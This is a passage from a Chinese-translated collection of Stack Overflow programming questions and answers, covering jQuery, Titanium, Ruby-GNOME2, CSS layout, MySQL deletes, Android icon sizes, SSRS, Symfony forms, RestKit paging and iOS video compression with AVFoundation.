        $('.nailthumb-container').nailthumb({
           width: '100',
           height: '100' 
         });
   });
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:55:44.600

你有`<div class="nailthumb-container square-thumb">`

和`$('#nailthumb-container').nailthumb({`

它应该是`$('.nailthumb-container').nailthumb({`

# titanium - 在 tableviewrow 钛中获取事件点击

> ID：11751868
> 
> 赞同：2
> 
> 时间：2012-08-01T02:40:53.997
> 
> 标签：titanium, tableview

我在 tableview 中自定义了一个带有图像和几个按钮的 tableviewrow。我已经获得了我单击的行的索引，但我需要这样做，以便当我单击 tableviewrow 中的按钮时，它将返回该行的索引。我还想测试一下我是否点击了行。我该怎么做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T07:44:38.940

[表的单击](http://docs.appcelerator.com/titanium/2.1/index.html#!/api/Titanium.UI.TableView-event-click)事件为您提供单击的行的行数据。因此，您可以访问分配给该行的所有数据。示例代码：

```
var data = [];
for(var i=0;i<5;i++)
{
    var row = Titanium.UI.createTableViewRow({
        id: i,
        title : 'some title'+i,
    });

    data.push(row);
}
table = Titanium.UI.createTableView({
    data : data
});
table.addEventListener('click', function(e) {
    alert(e.rowData.id+":"+e.rowData.title);
}); 
```

# ruby - Ruby-Gnome2 笔记本颜色

> ID：11751871
> 
> 赞同：3
> 
> 时间：2012-08-01T02:42:12.047
> 
> 标签：ruby, gtk2, ruby-gnome2

我希望能够在程序运行后动态更改 ruby​​-gnome2 中笔记本页面的背景颜色。我只找到了一种设置背景颜色的方法：

```
# Some page contents, for the sake of example
box1 = Gtk::HBox.new(false, 2)
box1.pack_start(Gtk::Label.new("Page 1"))
box2 = Gtk::HBox.new(false, 2)
box2.pack_start(Gtk::Label.new("Page 2"))

notebook = Gtk::Notebook.new      # Create a notebook object
notebook.append_page(box1)        # Create a page with box1 as contents
notebook.append_page(box2)        # Create a page with box2 as contents
style = notebook.style            # Copy the currently applied style
style.set_bg(Gtk::STATE_NORMAL, bg.red, bg.green, bg.blue) # Update the bg color
notebook.style = style            # Set notebook's style to the updated object 
```

`Gtk.main`如果在启动之前应用它，这很好。但是在窗口已经启动后它没有效果。我已经尝试在笔记本对象和页面内容上组合`modify_bg`和，但没有效果。`modify_base`

有没有合适的方法来设置笔记本页面的颜色，它不是那么骇人听闻，并且可以在主循环运行后应用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2017-05-02T09:26:46.433

你的问题是 5 年前的问题，但我会给你一个例子，说明我是如何使用最新版本的 Ruby-GNOME2 绑定的。如果不是你，也许它仍然可以对其他人派上用场：

```
color = Gdk::Color.parse("#003366")

button1.signal_connect("clicked") {
   textview1.override_background_color(Gtk::StateFlags::NORMAL, Gdk::RGBA.new(color.red, color.green, color.blue))
}

Gtk.main 
```

如果这就是您的意思，那么该按钮可以在 Gtk 主循环开始后更改 textview 小部件颜色。当然，它也应该与笔记本小部件一起使用。

我不得不说我刚开始使用 Ruby-GNOME2 绑定，我不确定这是目前推荐的修改 UI 外观的方法，但它确实有效。

# html - 定位两个按钮

> ID：11751875
> 
> 赞同：1
> 
> 时间：2012-08-01T02:42:57.047
> 
> 标签：html, css

我有一个区域，我想在其中添加两个按钮。左侧的按钮是“Sunday”，右侧的按钮是“misc”。我想要的是均匀放置两个按钮。因为两个按钮的大小相同，所以我将它们分配给相同的类。编码：

```
<div id="switcher"> 
 <div class="button" id="Sunday">Sunday</div>
 <div class="button" id="mic">mic</div> 
```

所以我认为星期天自然是在左边。我只想添加一些规则来分隔两个按钮，例如向左填充...但是结果是“星期日”在右侧。为什么？请在[jsfiddle 查看我的 CSS。](http://jsfiddle.net/zhshqzyc/ftQD5/)

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:57:38.517

关于你的 CSS，`position:absolute`on`.button`并且`.mic`把事情搞砸了。去掉这两个实例，你或多或少会得到你所期望的（左边是星期天，右边是麦克风，带有明显左侧填充的麦克风等）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T03:11:59.517

按钮已`position`设置为`absolute`。将其从 .button 类和 ID（#Sunday 和 #mic）中删除。

此外，我建议去掉按钮的边距和填充，并使用 display:inline-block 而不是 inline。您不能在内联元素中指定宽度或高度，并且块元素通常不能在没有额外摆弄的情况下呈现在同一水平线上。

如果您绝对必须将切换器宽度设置为 456 像素，那么您可以将按钮设置为宽度 228 像素（其中的 1/2）。html 中按钮 div 之间的换行符在按钮之间添加了一个空格，因此您应该将第二个 div 紧跟在第一个 div 之后。

这是您尝试做的更易于管理的版本。[http://jsfiddle.net/ftQD5/19/](http://jsfiddle.net/ftQD5/19/)

编辑：如果要垂直对齐按钮/文本，可以先将按钮设置为`position:relative`，然后设置`top:<vertical offset>px`. 这将向下移动按钮。然后，您可以添加`padding-top`按钮以使文本垂直居中显示。在这里可以看到一个更新的例子：http: [//jsfiddle.net/ftQD5/20/](http://jsfiddle.net/ftQD5/20/)

编辑#2：在周围的 div 中垂直居中文本的更简单方法是使`line-height`等于 div 高度。这将自动使文本居中。它也比 更容易使用，`padding-top`因为它不会影响按钮 div 的高度。最后更新的小提琴：http: [//jsfiddle.net/ftQD5/26/](http://jsfiddle.net/ftQD5/26/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T02:58:56.173

这是因为在按钮类上，您的 margin-left 为 120，但您将 mic id 的 margin-left 属性重置为 0。

**编辑** 清洁器小提琴做你想做的事：http: [//jsfiddle.net/ftQD5/13/](http://jsfiddle.net/ftQD5/13/)

# mysql - 用于删除列值在指定范围之间的记录的正确 MySQL 语法

> ID：11751876
> 
> 赞同：1
> 
> 时间：2012-08-01T02:43:15.727
> 
> 标签：mysql

我想删除 MySQL 表中的所有记录，其中“id”列中的值大于某个值且小于某个值..

我试过这个：

```
 DELETE FROM `jos_users` WHERE `id` > 1303856 AND 'id' < 2557250 ; 
```

但是发生的情况是所有记录 > 1303856 都被删除了..包括值 2557250 和超过 2557250 的 id...

那么在这种情况下，正确的 mysql 查询或语法可能是什么？

提前致谢..

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:45:41.603

可以尝试之间

```
delete from `jos_users` where id between 1303856 and 2557250 
```

> 这也应该有效。注意`id` 和'id'。``和''之间的区别

```
DELETE FROM `jos_users` WHERE `id` > 1303856 AND `id` < 2557250 ; 
```

# android - Android Logo 太小

> ID：11751877
> 
> 赞同：2
> 
> 时间：2012-08-01T02:43:27.553
> 
> 标签：android, icons, size

我认识到我的一个应用程序的启动器图标太小了。该设备是 samsung nexus galaxy，因此它应该使用 mdpi 文件夹中的 drawables。

我希望图标大小为 72 x 72 像素。实际上这个图标看起来很小或者特别小，它肯定比这款手机上的所有启动图标都要小。我记得我在每个可绘制文件夹中放了很多标准大小的图标。此时所有文件夹都包含相同的 72 x 72 像素图标（在 bin/res/... 和根 res/... 内部，因此不太可能是 eclipse 或 A SDK 的错误。

我卸载了应用程序，我创建了一个新项目，我换了电脑，这个图标仍然太小，我不知道为什么。

我认为我的清单中没有任何有趣的东西可能导致这种情况。

```
 <uses-sdk
        android:minSdkVersion="8"
        android:targetSdkVersion="15" /> 
```

你能帮助我吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-01T02:46:08.933

启动器图标不应为 75x75。

请参阅[Android 文档](http://developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html#size)以了解您应该为启动器图标大小使用什么。

```
ldpi:  36x36px
mdpi:  48x48px
hdpi:  72x72px
xhdpi: 96x96px 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T02:49:18.197

您确定您的设备是 mdpi 吗？如果不检查，大多数新设备至少是 hdpi。不过，正如 Geoff 所说，75 x 75 的尺寸并不合适。在这里检查并确保您拥有所有正确的尺寸：

[http://developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html#size](http://developer.android.com/guide/practices/ui_guidelines/icon_design_launcher.html#size)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-01T03:01:24.223

Glaxy nexus 肯定是 XHDPI 手机，因此在 drawable-xhdpi 中放置 72x72 图标大小是不正确的，因为它不遵守[图标设计指南](http://developer.android.com/guide/practices/ui_guidelines/icon_design.html)。您应该在 drawable-xhdpi 中放置 96x96 图标大小

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-02-25T17:38:31.510

以下是应用程序图标尺寸：

```
ldpi = 36*36 pixels
mdpi = 48*48 pixels
hdpi = 72*72 pixels
x-hdpi = 96*96 pixels
xx-hdpi = 144*144 pixels 
```

# reporting-services - 在本地主机部署SSRS报告---重复出现登录对话框

> ID：11751878
> 
> 赞同：1
> 
> 时间：2012-08-01T02:43:33.163
> 
> 标签：reporting-services, sql-server-2008-r2

我创建了 SSRS 报告并从 SQL Server 2008 R2 (TargetServerURL-http://localhost/ReportServer) 获取信息。现在，我正在尝试在本地主机上部署此报告，当我这样做时，我会重复看到一个登录对话框（报告服务登录）。我试图提供我的机器凭据和 sql server 凭据，但没有任何效果。有什么办法可以解决这个问题。谁能帮我这个。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T04:52:07.057

您还需要在用户浏览器中将 SSRS 实例的 URL 设置为可信站点。根据您的配置，您可能还必须配置 Kerberos 身份验证，而不是默认 (NTLM)

# php - 我可以在 symfony2 的 FormType 类中构建两个表单吗？

> ID：11751879
> 
> 赞同：0
> 
> 时间：2012-08-01T02:43:45.017
> 
> 标签：php, symfony, doctrine-orm

我有这个表单类

```
class ProfileType extends AbstractType
{
    public function buildForm(FormBuilder $builder, array $options)
    {
        $builder

            ->add('name')
            ->add('class')
            ->add('age')
            ->add('parent')
     } 
```

我的问题是我需要两种形式，一种用于需要所有字段的后端，另一种用于需要少量字段的前端。

我是否需要为两个表单创建单独的类，或者我可以以某种方式将两个表单放在一个类中，比如假设我不想在前端显示父级。

问题是如果我在模板中只显示几个字段，那么当我提交表单时这些字段设置为空。所以我需要从班级本身中删除

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T09:47:45.540

您可以使用 $options 参数。

```
$form = $this->createForm(new ProfileType(), $profile, array('status' => 'backend')); 
```

在您的 buildForm 中：

```
public function buildForm(FormBuilder $builder, array $options)
{
    $builder->add('name')
            ->add('class')
            ->add('age')
            ->add('parent');

    if($options['status'] == 'backend')
     {
        $builder->add('other1')
                ->add('other2');
     }
} 
```

但这是一个相当肮脏的解决方案，我个人会创建两种类型。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-10T08:03:00.163

也添加默认选项：

```
class ProfileType extends AbstractType
{
    /**
     * @param FormBuilderInterface $builder
     * @param array $options
     */
    public function buildForm(FormBuilder $builder, array $options)
    {
        $builder->add('name')
            ->add('class')
            ->add('age')
            ->add('parent');

        if($options['status'] == 'backend')
        {
            $builder->add('other1')
                ->add('other2');
        }
    }

    /**
     * @param OptionsResolverInterface $resolver
     */
    public function setDefaultOptions(OptionsResolverInterface $resolver)
    {
        $resolver->setDefaults(array(
            'data_class' => 'AppBundle\Entity\Profile',
            'status' => 'frontend',
        ));
    }

    /**
     * @return string
     */
    public function getName()
    {
        return 'appbundle_profile';
    }
} 
```

现在您可以在没有额外选项或带有额外选项的情况下使用表单类型。如果没有默认选项，将被使用。

# objective-c - 如何使用 RestKit 获取结果页面？

> ID：11751880
> 
> 赞同：2
> 
> 时间：2012-08-01T02:43:54.103
> 
> 标签：objective-c, ios, pagination, paging, restkit

我正在使用 RestKit 0.10.1，我正在寻找一些示例代码来处理对结果进行分页的 Web 服务。我有 GET 请求获取没有参数的第一页并将它们粘贴到 UITableView 中。理想情况下，当我到达页面底部时，它会获取下一页并将这些值插入底部。

我想我应该澄清一下，我更关心如何进行抓取，而不是如何将它们粘贴到桌子的尽头，但如果有这方面的建议，我很想听听。这些记录也没有存储在托管对象中，它们只是在内存中。

**更新：**在将我的 Google 搜索从“分页”切换到“分页”之后，我遇到了[RKObjectPaginator](http://restkit.org/api/master/Classes/RKObjectPaginator.html)，并意识到我正在处理的 API 已经脑残了，并且没有输出任何关于你所在页面或其所在页面的计数或数据尺寸。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-01T06:42:43.200

正如您所说，您通常可以使用 RKObjectPaginator。但有时，正如您所说，如果您的 API 不兼容，它就不能很好地工作。

您可以通过执行以下操作来完全自定义分页：

1）创建 RKObjectPaginator 的子类（或者如果你想沿着这条路线走，你自己的类）。

2）关键是重写这个委托方法

```
- (void) objectLoader:(RKObjectLoader *)loader willMapData:(inout __autoreleasing id *)mappableData; 
```

3) 在此方法中，您获取 mappableData 对象并找到“下一页”参数。不管你怎么做，这取决于你。下面是使用 Bing API 的示例。

```
- (void) objectLoader:(RKObjectLoader *)loader willMapData:(inout __autoreleasing id *)mappableData {
    NSMutableDictionary* d = [[*mappableData objectForKey: @"d"] mutableCopy];

    NSString* next = [d objectForKey: @"__next"];

    if(!next) {
        currentOffset = 0;
    }
    else {
        NSDictionary* params = [next queryParameters];
        perPage = [[params objectForKey: @"$top"] intValue];
        currentOffset = [[params objectForKey: @"$skip"] intValue];
    }
} 
```

重要的是在将数据传递到目标对象之前映射数据。这有效地允许您使用一个响应执行两个映射（一个映射到分页器对象，一个映射到您的数据模型）。

# css - 与段落文本内联显示 Facebook 类似框

> ID：11751882
> 
> 赞同：0
> 
> 时间：2012-08-01T02:44:34.360
> 
> 标签：css, facebook-likebox

我想显示一个带有计数的类似框，以便它**在此处显示为我的文本**[Like] <[2000]

默认情况下，like 框位于新行上，因此显示为

```
My text here
[Like] <[2000] 
```

目前，我使用 CSS 来相对定位 div，代码如下：

```
<p><strong>My text here</strong></p>
<div class="fb-like" data-href="https://www.facebook.com/FacebookDevelopers" data-send="false" data-layout="button_count" data-width="450" data-show-faces="true" data-font="arial"
style="position:relative; top:-36px; left:230px;"></div> 
```

有没有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T06:01:38.753

您给定的链接工作正常，您只需要在`<P>`标签上添加以下 css 属性，还需要添加 css`clear`属性，例如：

```
<p style="float: left;margin-right: 10px;"><strong>My text here</strong></p> 
```

请检查以供参考

[http://jsfiddle.net/ktzxN/3/](http://jsfiddle.net/ktzxN/3/)

希望有效！！！！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T06:13:52.227

请在以下链接中找到多行文本的解决方案！

[http://jsfiddle.net/ktzxN/4/](http://jsfiddle.net/ktzxN/4/)

现在这个布局变成了 Liquid，你可以在任何分辨率上使用这个布局。！！！！！！

高压乐趣:-)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T04:19:58.500

嘿，现在习惯了这段代码并根据您的布局定义父 div 的宽度或高度

```
 <p><strong>My text here</strong></p>
    <div style="display:inline-block;
vertical-align:top;
position:relative;
width:200px;
height:100px;
">
    <div class="fb-like" data-href="https://www.facebook.com/FacebookDevelopers" data-send="false" data-layout="button_count" data-width="450" data-show-faces="true" data-font="arial"
    style="position:absolute;
 top:0; 
left:0;">
</div>
    </div> 
```

# objective-c - 如何减小使用 UIImagePickerController 创建的视频的文件大小？

> ID：11751883
> 
> 赞同：57
> 
> 时间：2012-08-01T02:44:44.427
> 
> 标签：objective-c, ios, video, file-upload, avfoundation

我有一个应用程序，允许用户录制视频，`UIImagePickerController`然后将其上传到 YouTube。问题是`UIImagePickerController`创建的视频文件很大，即使视频只有 5 秒长。例如，一个 5 秒长的视频是 16-20 兆字节。我想将视频保持在 540 或 720 质量，但我想减小文件大小。

我一直在尝试使用 AVFoundation 并`AVAssetExportSession`尝试获得更小的文件大小。我试过以下代码：

```
AVAsset *video = [AVAsset assetWithURL:videoURL];
AVAssetExportSession *exportSession = [AVAssetExportSession exportSessionWithAsset:video presetName:AVAssetExportPresetPassthrough];
exportSession.shouldOptimizeForNetworkUse = YES;
exportSession.outputFileType = AVFileTypeMPEG4;
exportSession.outputURL = [pathToSavedVideosDirectory URLByAppendingPathComponent:@"vid1.mp4"];
[exportSession exportAsynchronouslyWithCompletionHandler:^{
    NSLog(@"done processing video!");
}]; 
```

但这**并没有减少文件大小**。我知道我正在做的事情是可能的，因为在 Apple 的照片应用程序中，当您选择**“在 YouTube 上分享”**时，会自动处理视频文件，使其足够小以上传。我想在我的应用程序中做同样的事情。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-08-05T19:23:55.890

使用`AVCaptureSession`并且`AVAssetWriter`您可以像这样设置压缩设置：

```
NSDictionary *settings = @{AVVideoCodecKey:AVVideoCodecH264,
                           AVVideoWidthKey:@(video_width),
                           AVVideoHeightKey:@(video_height),
                           AVVideoCompressionPropertiesKey:
                               @{AVVideoAverageBitRateKey:@(desired_bitrate),
                                 AVVideoProfileLevelKey:AVVideoProfileLevelH264Main31, /* Or whatever profile & level you wish to use */
                                 AVVideoMaxKeyFrameIntervalKey:@(desired_keyframe_interval)}};

AVAssetWriterInput* writer_input = [AVAssetWriterInput assetWriterInputWithMediaType:AVMediaTypeVideo outputSettings:settings]; 
```

编辑：我想如果你坚持使用`UIImagePicker`来创建电影，你将不得不使用`AVAssetReader's` `copyNextSampleBuffer`和`AVAssetWriter's` `appendSampleBuffer`方法来进行转码。

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-04-16T10:59:41.490

yourfriendzak 是对的：设置`cameraUI.videoQuality = UIImagePickerControllerQualityTypeLow;`不是这里的解决方案。解决方案是降低数据速率或比特率，这正是 jgh 所建议的。

我有，三种方法。第一个方法处理`UIImagePicker`委托方法：

```
// For responding to the user accepting a newly-captured picture or movie
- (void) imagePickerController: (UIImagePickerController *) picker didFinishPickingMediaWithInfo: (NSDictionary *) info {

// Handle movie capture
NSURL *movieURL = [info objectForKey:
                            UIImagePickerControllerMediaURL];

NSURL *uploadURL = [NSURL fileURLWithPath:[[NSTemporaryDirectory() stringByAppendingPathComponent:[self randomString]] stringByAppendingString:@".mp4"]];

// Compress movie first
[self convertVideoToLowQuailtyWithInputURL:movieURL outputURL:uploadURL];
} 
```

第二种方法将视频转换为较低的比特率，而不是较低的尺寸。

```
- (void)convertVideoToLowQuailtyWithInputURL:(NSURL*)inputURL
                               outputURL:(NSURL*)outputURL
{
//setup video writer
AVAsset *videoAsset = [[AVURLAsset alloc] initWithURL:inputURL options:nil];

AVAssetTrack *videoTrack = [[videoAsset tracksWithMediaType:AVMediaTypeVideo] objectAtIndex:0];

CGSize videoSize = videoTrack.naturalSize;

NSDictionary *videoWriterCompressionSettings =  [NSDictionary dictionaryWithObjectsAndKeys:[NSNumber numberWithInt:1250000], AVVideoAverageBitRateKey, nil];

NSDictionary *videoWriterSettings = [NSDictionary dictionaryWithObjectsAndKeys:AVVideoCodecH264, AVVideoCodecKey, videoWriterCompressionSettings, AVVideoCompressionPropertiesKey, [NSNumber numberWithFloat:videoSize.width], AVVideoWidthKey, [NSNumber numberWithFloat:videoSize.height], AVVideoHeightKey, nil];

AVAssetWriterInput* videoWriterInput = [AVAssetWriterInput
                                         assetWriterInputWithMediaType:AVMediaTypeVideo
                                         outputSettings:videoWriterSettings];

videoWriterInput.expectsMediaDataInRealTime = YES;

videoWriterInput.transform = videoTrack.preferredTransform;

AVAssetWriter *videoWriter = [[AVAssetWriter alloc] initWithURL:outputURL fileType:AVFileTypeQuickTimeMovie error:nil];

[videoWriter addInput:videoWriterInput];

//setup video reader
NSDictionary *videoReaderSettings = [NSDictionary dictionaryWithObject:[NSNumber numberWithInt:kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange] forKey:(id)kCVPixelBufferPixelFormatTypeKey];

AVAssetReaderTrackOutput *videoReaderOutput = [[AVAssetReaderTrackOutput alloc] initWithTrack:videoTrack outputSettings:videoReaderSettings];

AVAssetReader *videoReader = [[AVAssetReader alloc] initWithAsset:videoAsset error:nil];

[videoReader addOutput:videoReaderOutput];

//setup audio writer
AVAssetWriterInput* audioWriterInput = [AVAssetWriterInput
                                        assetWriterInputWithMediaType:AVMediaTypeAudio
                                        outputSettings:nil];

audioWriterInput.expectsMediaDataInRealTime = NO;

[videoWriter addInput:audioWriterInput];

//setup audio reader
AVAssetTrack* audioTrack = [[videoAsset tracksWithMediaType:AVMediaTypeAudio] objectAtIndex:0];

AVAssetReaderOutput *audioReaderOutput = [AVAssetReaderTrackOutput assetReaderTrackOutputWithTrack:audioTrack outputSettings:nil];

AVAssetReader *audioReader = [AVAssetReader assetReaderWithAsset:videoAsset error:nil];

[audioReader addOutput:audioReaderOutput];    

[videoWriter startWriting];

//start writing from video reader
[videoReader startReading];

[videoWriter startSessionAtSourceTime:kCMTimeZero];

dispatch_queue_t processingQueue = dispatch_queue_create("processingQueue1", NULL);

[videoWriterInput requestMediaDataWhenReadyOnQueue:processingQueue usingBlock:
 ^{

     while ([videoWriterInput isReadyForMoreMediaData]) {

         CMSampleBufferRef sampleBuffer;

         if ([videoReader status] == AVAssetReaderStatusReading &&
             (sampleBuffer = [videoReaderOutput copyNextSampleBuffer])) {

             [videoWriterInput appendSampleBuffer:sampleBuffer];
             CFRelease(sampleBuffer);
         }

         else {

             [videoWriterInput markAsFinished];

             if ([videoReader status] == AVAssetReaderStatusCompleted) {

                 //start writing from audio reader
                 [audioReader startReading];

                 [videoWriter startSessionAtSourceTime:kCMTimeZero];

                 dispatch_queue_t processingQueue = dispatch_queue_create("processingQueue2", NULL);

                 [audioWriterInput requestMediaDataWhenReadyOnQueue:processingQueue usingBlock:^{

                     while (audioWriterInput.readyForMoreMediaData) {

                         CMSampleBufferRef sampleBuffer;

                         if ([audioReader status] == AVAssetReaderStatusReading &&
                             (sampleBuffer = [audioReaderOutput copyNextSampleBuffer])) {

                            [audioWriterInput appendSampleBuffer:sampleBuffer];
                                    CFRelease(sampleBuffer);
                         }

                         else {

                             [audioWriterInput markAsFinished];

                             if ([audioReader status] == AVAssetReaderStatusCompleted) {

                                 [videoWriter finishWritingWithCompletionHandler:^(){
                                     [self sendMovieFileAtURL:outputURL];
                                 }];

                             }
                         }
                     }

                 }
                  ];
             }
         }
     }
 }
 ];
} 
```

成功后，调用第三种方法，`sendMovieFileAtURL:`将压缩后的视频上传`outputURL`到服务器。

请注意，**我在我的项目中启用了 ARC**`release` ，因此如果您的项目中关闭了 ARC ，您将不得不添加一些调用。

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2012-08-04T20:38:36.490

`UImagePickerController`你有一个类型的[`videoQuality`](http://developer.apple.com/library/ios/documentation/uikit/reference/UIImagePickerController_Class/UIImagePickerController/UIImagePickerController.html#//apple_ref/occ/instp/UIImagePickerController/videoQuality)属性`UIImagePickerControllerQualityType`，并将应用于录制的电影以及你从库中挑选的那些（在转码阶段发生）。

或者，如果您必须处理不是来自库的现有资产（文件），您可能需要查看这些预设：

```
AVAssetExportPresetLowQuality
AVAssetExportPresetMediumQuality
AVAssetExportPresetHighestQuality 
```

和

```
AVAssetExportPreset640x480
AVAssetExportPreset960x540
AVAssetExportPreset1280x720
AVAssetExportPreset1920x1080 
```

并将其中一个传递给类的[初始化程序](https://developer.apple.com/library/mac/documentation/AVFoundation/Reference/AVAssetExportSession_Class/Reference/Reference.html#//apple_ref/occ/instm/AVAssetExportSession/initWithAsset:presetName:)`AVAssetExportSession`。恐怕您必须针对您的特定内容使用这些内容，因为没有关于什么是`low`和`medium`质量或将用于`640x480`或用于`1280x720`预设的质量的精确描述。文档中唯一有用的信息如下：

> 导出适用于设备的 QuickTime 文件的预设名称 您可以使用这些导出选项来生成具有适合当前设备的视频大小的 QuickTime .mov 文件。
> 
> 导出不会将视频从较小的尺寸放大。视频使用 H.264 压缩；音频使用 AAC 压缩
> 
> 某些设备不支持某些尺寸。

~~除此之外，我不记得在`AVFoundation`~~

**我错了，有一种方法可以调整你提到的所有参数，它确实是 AVAssetWriter：[如何将 UIImage 数组导出为电影？](https://stackoverflow.com/questions/3741323/how-do-i-export-uiimage-array-as-a-movie/3742212#3742212)**

顺便说一句，这是一个带有代码示例的类似问题的链接：[iPhone：以编程方式压缩录制的视频以共享？](https://stackoverflow.com/questions/5687341/iphoneprogrammatically-compressing-recorded-video-to-share)

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2015-04-29T08:20:47.477

Erik 的答案在他写它的时候可能是正确的——但现在使用 iOS8 它只是左右崩溃，我自己花了几个小时。

您需要博士学位才​​能使用 AVAssetWriter - 这很重要：[https ://developer.apple.com/library/mac/documentation/AudioVideo/Conceptual/AVFoundationPG/Articles/05_Export.html#//apple_ref/doc/uid/ TP40010188-CH9-SW1](https://developer.apple.com/library/mac/documentation/AudioVideo/Conceptual/AVFoundationPG/Articles/05_Export.html#//apple_ref/doc/uid/TP40010188-CH9-SW1)

有一个很棒的库可以完全按照您的意愿进行操作，它只是 AVAssetExportSession 的替代品，具有更重要的功能，例如更改比特率：[https ://github.com/rs/SDAVAssetExportSession](https://github.com/rs/SDAVAssetExportSession)

以下是如何使用它：

```
-(void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info
{

  SDAVAssetExportSession *encoder = [SDAVAssetExportSession.alloc initWithAsset:[AVAsset assetWithURL:[info objectForKey:UIImagePickerControllerMediaURL]]];
  NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
  NSString *documentsDirectory = [paths objectAtIndex:0];
  self.myPathDocs =  [documentsDirectory stringByAppendingPathComponent:
                      [NSString stringWithFormat:@"lowerBitRate-%d.mov",arc4random() % 1000]];
  NSURL *url = [NSURL fileURLWithPath:self.myPathDocs];
  encoder.outputURL=url;
  encoder.outputFileType = AVFileTypeMPEG4;
  encoder.shouldOptimizeForNetworkUse = YES;

  encoder.videoSettings = @
  {
  AVVideoCodecKey: AVVideoCodecH264,
  AVVideoCompressionPropertiesKey: @
    {
    AVVideoAverageBitRateKey: @2300000, // Lower bit rate here
    AVVideoProfileLevelKey: AVVideoProfileLevelH264High40,
    },
  };
  encoder.audioSettings = @
  {
  AVFormatIDKey: @(kAudioFormatMPEG4AAC),
  AVNumberOfChannelsKey: @2,
  AVSampleRateKey: @44100,
  AVEncoderBitRateKey: @128000,
  };

  [encoder exportAsynchronouslyWithCompletionHandler:^
  {
    int status = encoder.status;

    if (status == AVAssetExportSessionStatusCompleted)
    {
      AVAssetTrack *videoTrack = nil;
      AVURLAsset *asset = [AVAsset assetWithURL:encoder.outputURL];
      NSArray *videoTracks = [asset tracksWithMediaType:AVMediaTypeVideo];
      videoTrack = [videoTracks objectAtIndex:0];
      float frameRate = [videoTrack nominalFrameRate];
      float bps = [videoTrack estimatedDataRate];
      NSLog(@"Frame rate == %f",frameRate);
      NSLog(@"bps rate == %f",bps/(1024.0 * 1024.0));
      NSLog(@"Video export succeeded");
      // encoder.outputURL <- this is what you want!!
    }
    else if (status == AVAssetExportSessionStatusCancelled)
    {
      NSLog(@"Video export cancelled");
    }
    else
    {
      NSLog(@"Video export failed with error: %@ (%d)", encoder.error.localizedDescription, encoder.error.code);
    }
  }];
} 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2017-04-13T06:39:50.963

Erik Wegener 代码重写为 swift 3：

```
class func convertVideoToLowQuailtyWithInputURL(inputURL: NSURL, outputURL: NSURL, onDone: @escaping () -> ()) {
            //setup video writer
            let videoAsset = AVURLAsset(url: inputURL as URL, options: nil)
            let videoTrack = videoAsset.tracks(withMediaType: AVMediaTypeVideo)[0]
            let videoSize = videoTrack.naturalSize
            let videoWriterCompressionSettings = [
                AVVideoAverageBitRateKey : Int(125000)
            ]

            let videoWriterSettings:[String : AnyObject] = [
                AVVideoCodecKey : AVVideoCodecH264 as AnyObject,
                AVVideoCompressionPropertiesKey : videoWriterCompressionSettings as AnyObject,
                AVVideoWidthKey : Int(videoSize.width) as AnyObject,
                AVVideoHeightKey : Int(videoSize.height) as AnyObject
            ]

            let videoWriterInput = AVAssetWriterInput(mediaType: AVMediaTypeVideo, outputSettings: videoWriterSettings)
            videoWriterInput.expectsMediaDataInRealTime = true
            videoWriterInput.transform = videoTrack.preferredTransform
            let videoWriter = try! AVAssetWriter(outputURL: outputURL as URL, fileType: AVFileTypeQuickTimeMovie)
            videoWriter.add(videoWriterInput)
            //setup video reader
            let videoReaderSettings:[String : AnyObject] = [
                kCVPixelBufferPixelFormatTypeKey as String: Int(kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange) as AnyObject
            ]

            let videoReaderOutput = AVAssetReaderTrackOutput(track: videoTrack, outputSettings: videoReaderSettings)
            let videoReader = try! AVAssetReader(asset: videoAsset)
            videoReader.add(videoReaderOutput)
            //setup audio writer
            let audioWriterInput = AVAssetWriterInput(mediaType: AVMediaTypeAudio, outputSettings: nil)
            audioWriterInput.expectsMediaDataInRealTime = false
            videoWriter.add(audioWriterInput)
            //setup audio reader
            let audioTrack = videoAsset.tracks(withMediaType: AVMediaTypeAudio)[0]
            let audioReaderOutput = AVAssetReaderTrackOutput(track: audioTrack, outputSettings: nil)
            let audioReader = try! AVAssetReader(asset: videoAsset)
            audioReader.add(audioReaderOutput)
            videoWriter.startWriting()

            //start writing from video reader
            videoReader.startReading()
            videoWriter.startSession(atSourceTime: kCMTimeZero)
            let processingQueue = DispatchQueue(label: "processingQueue1")
            videoWriterInput.requestMediaDataWhenReady(on: processingQueue, using: {() -> Void in
                while videoWriterInput.isReadyForMoreMediaData {
                    let sampleBuffer:CMSampleBuffer? = videoReaderOutput.copyNextSampleBuffer();
                    if videoReader.status == .reading && sampleBuffer != nil {
                        videoWriterInput.append(sampleBuffer!)
                    }
                    else {
                        videoWriterInput.markAsFinished()
                        if videoReader.status == .completed {
                            //start writing from audio reader
                            audioReader.startReading()
